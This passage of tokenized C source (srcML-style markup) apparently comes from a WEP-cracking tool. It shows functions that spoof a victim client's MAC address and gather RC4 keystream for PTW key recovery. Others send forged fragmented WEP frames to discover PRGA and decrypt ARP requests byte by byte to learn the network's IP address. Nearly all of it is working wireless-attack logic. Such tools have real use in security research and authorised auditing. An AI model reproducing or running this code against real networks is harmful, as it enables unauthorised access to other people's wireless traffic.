name|memcpy
argument_list|(
name|ptr
argument_list|,
literal|"\x00\x01"
argument_list|,
name|len
argument_list|)
expr_stmt|;
else|else
name|memcpy
argument_list|(
name|ptr
argument_list|,
literal|"\x00\x02"
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
comment|/* src mac */
name|len
operator|=
literal|6
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
name|get_sa
argument_list|(
name|wh
argument_list|)
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
name|len
operator|=
name|ptr
operator|-
operator|(
operator|(
name|unsigned
name|char
operator|*
operator|)
name|clear
operator|)
expr_stmt|;
return|return
name|len
return|;
block|}
end_function

begin_function
name|void
name|add_keystream
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|rd
parameter_list|)
block|{
name|unsigned
name|char
name|clear
index|[
literal|1024
index|]
decl_stmt|;
name|int
name|dlen
init|=
name|rd
operator|-
sizeof|sizeof
argument_list|(
expr|struct
name|ieee80211_frame
argument_list|)
operator|-
literal|4
operator|-
literal|4
decl_stmt|;
name|int
name|clearsize
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
init|=
operator|(
name|unsigned
name|char
operator|*
operator|)
operator|(
name|wh
operator|+
literal|1
operator|)
decl_stmt|;
name|int
name|i
decl_stmt|;
name|clearsize
operator|=
name|known_clear
argument_list|(
name|clear
argument_list|,
name|wh
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
if|if
condition|(
name|clearsize
operator|<
literal|16
condition|)
return|return;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|16
condition|;
name|i
operator|++
control|)
name|clear
index|[
name|i
index|]
operator|^=
name|body
index|[
literal|4
operator|+
name|i
index|]
expr_stmt|;
name|PTW_addsession
argument_list|(
name|ptw
argument_list|,
name|body
argument_list|,
name|clear
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|got_wep
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|rd
parameter_list|)
block|{
name|int
name|bodylen
decl_stmt|;
name|int
name|dlen
decl_stmt|;
name|unsigned
name|char
name|clear
index|[
literal|1024
index|]
decl_stmt|;
name|int
name|clearsize
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|bodylen
operator|=
name|rd
operator|-
sizeof|sizeof
argument_list|(
expr|struct
name|ieee80211_frame
argument_list|)
expr_stmt|;
name|dlen
operator|=
name|bodylen
operator|-
literal|4
operator|-
literal|4
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
comment|// log it if its stuff not from us...
if|if
condition|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
operator|)
operator|||
operator|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_TODS
operator|)
operator|&&
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr2
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
operator|!=
literal|0
operator|)
condition|)
block|{
if|if
condition|(
name|body
index|[
literal|3
index|]
operator|!=
literal|0
condition|)
block|{
name|time_print
argument_list|(
literal|"Key index=%x!!\n"
argument_list|,
name|body
index|[
literal|3
index|]
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|log_wep
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
name|add_keystream
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
comment|// try to decrypt too
name|try_dictionary
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
block|}
comment|// look for arp-request packets... so we can decrypt em
if|if
condition|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
operator|!=
literal|0
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr1
argument_list|,
literal|"\xff\xff\xff\xff\xff\xff"
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|&&
operator|(
name|dlen
operator|==
literal|36
operator|||
name|dlen
operator|==
name|PADDED_ARPLEN
operator|)
operator|&&
operator|!
name|decryptstate
operator|.
name|cipher
operator|&&
operator|!
name|netip
condition|)
block|{
name|decrypt_arpreq
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
block|}
comment|// we have prga... check if its our stuff being relayed...
if|if
condition|(
name|prgainfo
operator|.
name|len
operator|!=
literal|0
condition|)
block|{
comment|// looks like it...
if|if
condition|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr1
argument_list|,
literal|"\xff\xff\xff\xff\xff\xff"
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|&&
name|dlen
operator|==
name|fragstate
operator|.
name|len
condition|)
block|{
comment|//			printf("I fink AP relayed it...\n");
name|set_prga
argument_list|(
name|body
argument_list|,
operator|&
name|body
index|[
literal|4
index|]
argument_list|,
name|fragstate
operator|.
name|data
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|free
argument_list|(
name|fragstate
operator|.
name|data
argument_list|)
expr_stmt|;
name|fragstate
operator|.
name|data
operator|=
literal|0
expr_stmt|;
name|fragstate
operator|.
name|waiting_relay
operator|=
literal|0
expr_stmt|;
block|}
comment|// see if we get the multicast stuff of when decrypting
if|if
condition|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr1
argument_list|,
name|MCAST_PREF
argument_list|,
literal|5
argument_list|)
operator|==
literal|0
operator|)
operator|&&
name|dlen
operator|==
literal|36
condition|)
block|{
name|unsigned
name|char
name|pr
init|=
name|wh
operator|->
name|i_addr1
index|[
literal|5
index|]
decl_stmt|;
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Got clear-text byte: %d\n"
argument_list|,
name|decryptstate
operator|.
name|cipher
index|[
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
index|]
operator|^
name|pr
argument_list|)
expr_stmt|;
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
index|]
operator|=
name|pr
expr_stmt|;
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|++
expr_stmt|;
name|decryptstate
operator|.
name|fragstate
operator|.
name|waiting_relay
operator|=
literal|1
expr_stmt|;
comment|// ok we got the ip...
if|if
condition|(
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|==
literal|26
operator|+
literal|1
condition|)
block|{
name|unsigned
name|char
name|ip
index|[
literal|4
index|]
decl_stmt|;
name|int
name|i
decl_stmt|;
name|struct
name|in_addr
modifier|*
name|in
init|=
operator|(
expr|struct
name|in_addr
operator|*
operator|)
name|ip
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|4
condition|;
name|i
operator|++
control|)
name|ip
index|[
name|i
index|]
operator|=
name|decryptstate
operator|.
name|cipher
index|[
literal|8
operator|+
literal|8
operator|+
literal|6
operator|+
name|i
index|]
operator|^
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
literal|8
operator|+
literal|8
operator|+
literal|6
operator|+
name|i
index|]
expr_stmt|;
name|assert
argument_list|(
operator|!
name|netip
argument_list|)
expr_stmt|;
name|netip
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
literal|16
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|netip
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|memset
argument_list|(
name|netip
argument_list|,
literal|0
argument_list|,
literal|16
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|netip
argument_list|,
name|inet_ntoa
argument_list|(
operator|*
name|in
argument_list|)
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Got IP=(%s)\n"
argument_list|,
name|netip
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|myip
argument_list|,
name|netip
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|strchr
argument_list|(
name|myip
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|strchr
argument_list|(
name|ptr
operator|+
literal|1
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|strchr
argument_list|(
name|ptr
operator|+
literal|1
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ptr
operator|+
literal|1
argument_list|,
literal|"123"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"My IP=(%s)\n"
argument_list|,
name|myip
argument_list|)
expr_stmt|;
name|free
argument_list|(
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
argument_list|)
expr_stmt|;
name|free
argument_list|(
name|decryptstate
operator|.
name|cipher
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|decryptstate
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|decryptstate
argument_list|)
argument_list|)
expr_stmt|;
block|}
block|}
return|return;
block|}
name|clearsize
operator|=
name|known_clear
argument_list|(
name|clear
argument_list|,
name|wh
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Datalen %d Known clear %d\n"
argument_list|,
name|dlen
argument_list|,
name|clearsize
argument_list|)
expr_stmt|;
name|set_prga
argument_list|(
name|body
argument_list|,
operator|&
name|body
index|[
literal|4
index|]
argument_list|,
name|clear
argument_list|,
name|clearsize
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|stuff_for_net
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|rd
parameter_list|)
block|{
name|int
name|type
decl_stmt|,
name|stype
decl_stmt|;
name|type
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_TYPE_MASK
expr_stmt|;
name|stype
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_SUBTYPE_MASK
expr_stmt|;
if|if
condition|(
name|type
operator|==
name|IEEE80211_FC0_TYPE_DATA
operator|&&
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_DATA
condition|)
block|{
name|int
name|dlen
init|=
name|rd
operator|-
sizeof|sizeof
argument_list|(
expr|struct
name|ieee80211_frame
argument_list|)
decl_stmt|;
if|if
condition|(
name|state
operator|==
name|SPOOF_MAC
condition|)
block|{
name|unsigned
name|char
name|mac
index|[
literal|6
index|]
decl_stmt|;
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_TODS
condition|)
block|{
name|memcpy
argument_list|(
name|mac
argument_list|,
name|wh
operator|->
name|i_addr3
argument_list|,
literal|6
argument_list|)
expr_stmt|;
block|}
elseif|else
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
condition|)
block|{
name|memcpy
argument_list|(
name|mac
argument_list|,
name|wh
operator|->
name|i_addr1
argument_list|,
literal|6
argument_list|)
expr_stmt|;
block|}
else|else
name|assert
argument_list|(
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|mac
index|[
literal|0
index|]
operator|==
literal|0xff
operator|||
name|mac
index|[
literal|0
index|]
operator|==
literal|0x1
condition|)
return|return;
name|memcpy
argument_list|(
name|mymac
argument_list|,
name|mac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Trying to use MAC=(%s)\n"
argument_list|,
name|mac2str
argument_list|(
name|mymac
argument_list|)
argument_list|)
expr_stmt|;
name|state
operator|=
name|FOUND_VICTIM
expr_stmt|;
return|return;
block|}
comment|// wep data!
if|if
condition|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_WEP
operator|)
operator|&&
name|dlen
operator|>
operator|(
literal|4
operator|+
literal|8
operator|+
literal|4
operator|)
condition|)
block|{
name|got_wep
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
block|}
block|}
block|}
end_function

begin_function
name|void
name|anal
parameter_list|(
name|unsigned
name|char
modifier|*
name|buf
parameter_list|,
name|int
name|rd
parameter_list|,
name|int
name|tx
parameter_list|)
block|{
comment|// yze
name|struct
name|ieee80211_frame
modifier|*
name|wh
init|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|buf
decl_stmt|;
name|int
name|type
decl_stmt|,
name|stype
decl_stmt|;
specifier|static
name|int
name|lastseq
init|=
operator|-
literal|1
decl_stmt|;
name|int
name|seq
decl_stmt|;
name|unsigned
name|short
modifier|*
name|seqptr
decl_stmt|;
name|int
name|for_us
init|=
literal|0
decl_stmt|;
if|if
condition|(
name|rd
operator|<
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"rd=%d\n"
argument_list|,
name|rd
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|type
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_TYPE_MASK
expr_stmt|;
name|stype
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_SUBTYPE_MASK
expr_stmt|;
comment|// sort out acks
if|if
condition|(
name|state
operator|>=
name|FOUND_VICTIM
condition|)
block|{
comment|// stuff for us
if|if
condition|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr1
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
condition|)
block|{
name|for_us
operator|=
literal|1
expr_stmt|;
if|if
condition|(
name|type
operator|!=
name|IEEE80211_FC0_TYPE_CTL
condition|)
name|send_ack
argument_list|(
name|tx
argument_list|)
expr_stmt|;
block|}
block|}
comment|// XXX i know it aint great...
name|seqptr
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|wh
operator|->
name|i_seq
expr_stmt|;
name|seq
operator|=
operator|(
operator|*
name|seqptr
operator|&
name|IEEE80211_SEQ_SEQ_MASK
operator|)
operator|>>
name|IEEE80211_SEQ_SEQ_SHIFT
expr_stmt|;
if|if
condition|(
name|seq
operator|==
name|lastseq
operator|&&
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_RETRY
operator|)
operator|&&
name|type
operator|!=
name|IEEE80211_FC0_TYPE_CTL
condition|)
block|{
comment|//		printf("Ignoring dup packet... seq=%d\n", seq);
return|return;
block|}
name|lastseq
operator|=
name|seq
expr_stmt|;
comment|// management frame
if|if
condition|(
name|type
operator|==
name|IEEE80211_FC0_TYPE_MGT
condition|)
block|{
if|if
condition|(
name|state
operator|==
name|FIND_VICTIM
condition|)
block|{
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_BEACON
operator|||
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_PROBE_RESP
condition|)
block|{
if|if
condition|(
name|get_victim_ssid
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
condition|)
block|{
return|return;
block|}
block|}
block|}
block|}
if|if
condition|(
name|state
operator|>=
name|FOUND_VICTIM
condition|)
block|{
comment|// stuff for us
if|if
condition|(
name|for_us
condition|)
block|{
name|stuff_for_us
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
block|}
comment|// stuff in network [even for us]
if|if
condition|(
operator|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_TODS
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|victim
operator|.
name|bss
argument_list|,
name|wh
operator|->
name|i_addr1
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|)
operator|||
operator|(
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
operator|)
operator|&&
operator|(
name|memcmp
argument_list|(
name|victim
operator|.
name|bss
argument_list|,
name|wh
operator|->
name|i_addr2
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
operator|)
operator|)
condition|)
block|{
name|stuff_for_net
argument_list|(
name|wh
argument_list|,
name|rd
argument_list|)
expr_stmt|;
block|}
block|}
block|}
end_function

begin_function
name|void
name|do_arp
parameter_list|(
name|unsigned
name|char
modifier|*
name|buf
parameter_list|,
name|unsigned
name|short
name|op
parameter_list|,
name|unsigned
name|char
modifier|*
name|m1
parameter_list|,
name|unsigned
name|char
modifier|*
name|i1
parameter_list|,
name|unsigned
name|char
modifier|*
name|m2
parameter_list|,
name|unsigned
name|char
modifier|*
name|i2
parameter_list|)
block|{
name|struct
name|in_addr
name|sip
decl_stmt|;
name|struct
name|in_addr
name|dip
decl_stmt|;
name|struct
name|arphdr
modifier|*
name|h
decl_stmt|;
name|unsigned
name|char
modifier|*
name|data
decl_stmt|;
name|inet_aton
argument_list|(
name|i1
argument_list|,
operator|&
name|sip
argument_list|)
expr_stmt|;
name|inet_aton
argument_list|(
name|i2
argument_list|,
operator|&
name|dip
argument_list|)
expr_stmt|;
name|h
operator|=
operator|(
expr|struct
name|arphdr
operator|*
operator|)
name|buf
expr_stmt|;
name|memset
argument_list|(
name|h
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|h
argument_list|)
argument_list|)
expr_stmt|;
name|h
operator|->
name|ar_hrd
operator|=
name|htons
argument_list|(
name|ARPHRD_ETHER
argument_list|)
expr_stmt|;
name|h
operator|->
name|ar_pro
operator|=
name|htons
argument_list|(
name|ETHERTYPE_IP
argument_list|)
expr_stmt|;
name|h
operator|->
name|ar_hln
operator|=
literal|6
expr_stmt|;
name|h
operator|->
name|ar_pln
operator|=
literal|4
expr_stmt|;
name|h
operator|->
name|ar_op
operator|=
name|htons
argument_list|(
name|op
argument_list|)
expr_stmt|;
name|data
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|h
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|h
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|data
argument_list|,
name|m1
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|data
operator|+=
literal|6
expr_stmt|;
name|memcpy
argument_list|(
name|data
argument_list|,
operator|&
name|sip
argument_list|,
literal|4
argument_list|)
expr_stmt|;
name|data
operator|+=
literal|4
expr_stmt|;
name|memcpy
argument_list|(
name|data
argument_list|,
name|m2
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|data
operator|+=
literal|6
expr_stmt|;
name|memcpy
argument_list|(
name|data
argument_list|,
operator|&
name|dip
argument_list|,
literal|4
argument_list|)
expr_stmt|;
name|data
operator|+=
literal|4
expr_stmt|;
block|}
end_function

begin_function
name|void
name|send_fragment
parameter_list|(
name|int
name|tx
parameter_list|,
name|struct
name|frag_state
modifier|*
name|fs
parameter_list|,
name|struct
name|prga_info
modifier|*
name|pi
parameter_list|)
block|{
name|unsigned
name|char
name|buf
index|[
literal|4096
index|]
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|int
name|fragsize
decl_stmt|;
name|uLong
name|crc
decl_stmt|;
name|unsigned
name|long
modifier|*
name|pcrc
decl_stmt|;
name|int
name|i
decl_stmt|;
name|unsigned
name|short
modifier|*
name|seq
decl_stmt|;
name|unsigned
name|short
name|sn
decl_stmt|,
name|fn
decl_stmt|;
name|wh
operator|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|buf
expr_stmt|;
name|memcpy
argument_list|(
name|wh
argument_list|,
operator|&
name|fs
operator|->
name|wh
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|body
argument_list|,
operator|&
name|pi
operator|->
name|iv
argument_list|,
literal|3
argument_list|)
expr_stmt|;
name|body
operator|+=
literal|3
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|0
expr_stmt|;
comment|// key index
name|fragsize
operator|=
name|fs
operator|->
name|data
operator|+
name|fs
operator|->
name|len
operator|-
name|fs
operator|->
name|ptr
expr_stmt|;
name|assert
argument_list|(
name|fragsize
operator|>
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
operator|(
name|fragsize
operator|+
literal|4
operator|)
operator|>
name|pi
operator|->
name|len
condition|)
block|{
name|fragsize
operator|=
name|pi
operator|->
name|len
operator|-
literal|4
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_MORE_FRAG
expr_stmt|;
block|}
comment|// last fragment
else|else
block|{
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&=
operator|~
name|IEEE80211_FC1_MORE_FRAG
expr_stmt|;
block|}
name|memcpy
argument_list|(
name|body
argument_list|,
name|fs
operator|->
name|ptr
argument_list|,
name|fragsize
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
literal|0L
argument_list|,
name|Z_NULL
argument_list|,
literal|0
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
name|crc
argument_list|,
name|body
argument_list|,
name|fragsize
argument_list|)
expr_stmt|;
name|pcrc
operator|=
operator|(
name|unsigned
name|long
operator|*
operator|)
operator|(
name|body
operator|+
name|fragsize
operator|)
expr_stmt|;
operator|*
name|pcrc
operator|=
name|crc
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
operator|(
name|fragsize
operator|+
literal|4
operator|)
condition|;
name|i
operator|++
control|)
name|body
index|[
name|i
index|]
operator|^=
name|pi
operator|->
name|prga
index|[
name|i
index|]
expr_stmt|;
name|seq
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
operator|&
name|wh
operator|->
name|i_seq
expr_stmt|;
name|sn
operator|=
operator|(
operator|*
name|seq
operator|&
name|IEEE80211_SEQ_SEQ_MASK
operator|)
operator|>>
name|IEEE80211_SEQ_SEQ_SHIFT
expr_stmt|;
name|fn
operator|=
operator|*
name|seq
operator|&
name|IEEE80211_SEQ_FRAG_MASK
expr_stmt|;
comment|//	printf ("Sent frag (data=%d) (seq=%d fn=%d)\n", fragsize, sn, fn);
name|send_frame
argument_list|(
name|tx
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|4
operator|+
name|fragsize
operator|+
literal|4
argument_list|)
expr_stmt|;
name|seq
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
operator|&
name|fs
operator|->
name|wh
operator|.
name|i_seq
expr_stmt|;
operator|*
name|seq
operator|=
name|fnseq
argument_list|(
operator|++
name|fn
argument_list|,
name|sn
argument_list|)
expr_stmt|;
name|fs
operator|->
name|ptr
operator|+=
name|fragsize
expr_stmt|;
if|if
condition|(
name|fs
operator|->
name|ptr
operator|-
name|fs
operator|->
name|data
operator|==
name|fs
operator|->
name|len
condition|)
block|{
comment|//		printf("Finished sending frags...\n");
name|fs
operator|->
name|waiting_relay
operator|=
literal|1
expr_stmt|;
block|}
block|}
end_function

begin_function
name|void
name|prepare_fragstate
parameter_list|(
name|struct
name|frag_state
modifier|*
name|fs
parameter_list|,
name|int
name|pad
parameter_list|)
block|{
name|fs
operator|->
name|waiting_relay
operator|=
literal|0
expr_stmt|;
name|fs
operator|->
name|len
operator|=
literal|8
operator|+
literal|8
operator|+
literal|20
operator|+
name|pad
expr_stmt|;
name|fs
operator|->
name|data
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|fs
operator|->
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|fs
operator|->
name|data
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|fs
operator|->
name|ptr
operator|=
name|fs
operator|->
name|data
expr_stmt|;
name|do_llc
argument_list|(
name|fs
operator|->
name|data
argument_list|,
name|ETHERTYPE_ARP
argument_list|)
expr_stmt|;
name|do_arp
argument_list|(
operator|&
name|fs
operator|->
name|data
index|[
literal|8
index|]
argument_list|,
name|ARPOP_REQUEST
argument_list|,
name|mymac
argument_list|,
name|myip
argument_list|,
literal|"\x00\x00\x00\x00\x00\x00"
argument_list|,
literal|"192.168.0.1"
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|fs
operator|->
name|wh
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|fs
operator|->
name|wh
argument_list|)
argument_list|)
expr_stmt|;
name|fill_basic
argument_list|(
operator|&
name|fs
operator|->
name|wh
argument_list|)
expr_stmt|;
name|memset
argument_list|(
name|fs
operator|->
name|wh
operator|.
name|i_addr3
argument_list|,
literal|0xff
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|fs
operator|->
name|wh
operator|.
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_DATA
expr_stmt|;
name|fs
operator|->
name|wh
operator|.
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_DIR_TODS
operator||
name|IEEE80211_FC1_MORE_FRAG
operator||
name|IEEE80211_FC1_WEP
expr_stmt|;
name|memset
argument_list|(
operator|&
name|fs
operator|->
name|data
index|[
literal|8
operator|+
literal|8
operator|+
literal|20
index|]
argument_list|,
literal|0
argument_list|,
name|pad
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|discover_prga
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
comment|// create packet...
if|if
condition|(
operator|!
name|fragstate
operator|.
name|data
condition|)
block|{
name|int
name|pad
init|=
literal|0
decl_stmt|;
if|if
condition|(
name|prgainfo
operator|.
name|len
operator|>=
literal|20
condition|)
name|pad
operator|=
name|prgainfo
operator|.
name|len
operator|*
literal|3
expr_stmt|;
name|prepare_fragstate
argument_list|(
operator|&
name|fragstate
argument_list|,
name|pad
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
operator|!
name|fragstate
operator|.
name|waiting_relay
condition|)
block|{
name|send_fragment
argument_list|(
name|tx
argument_list|,
operator|&
name|fragstate
argument_list|,
operator|&
name|prgainfo
argument_list|)
expr_stmt|;
if|if
condition|(
name|fragstate
operator|.
name|waiting_relay
condition|)
block|{
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|fragstate
operator|.
name|last
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
block|}
block|}
block|}
end_function

begin_function
name|void
name|decrypt
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
comment|// gotta initiate
if|if
condition|(
operator|!
name|decryptstate
operator|.
name|fragstate
operator|.
name|data
condition|)
block|{
name|prepare_fragstate
argument_list|(
operator|&
name|decryptstate
operator|.
name|fragstate
argument_list|,
literal|0
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|decryptstate
operator|.
name|fragstate
operator|.
name|wh
operator|.
name|i_addr3
argument_list|,
name|MCAST_PREF
argument_list|,
literal|5
argument_list|)
expr_stmt|;
name|decryptstate
operator|.
name|fragstate
operator|.
name|wh
operator|.
name|i_addr3
index|[
literal|5
index|]
operator|=
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
index|]
expr_stmt|;
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|++
expr_stmt|;
block|}
comment|// guess diff prga byte...
if|if
condition|(
name|decryptstate
operator|.
name|fragstate
operator|.
name|waiting_relay
condition|)
block|{
name|unsigned
name|short
modifier|*
name|seq
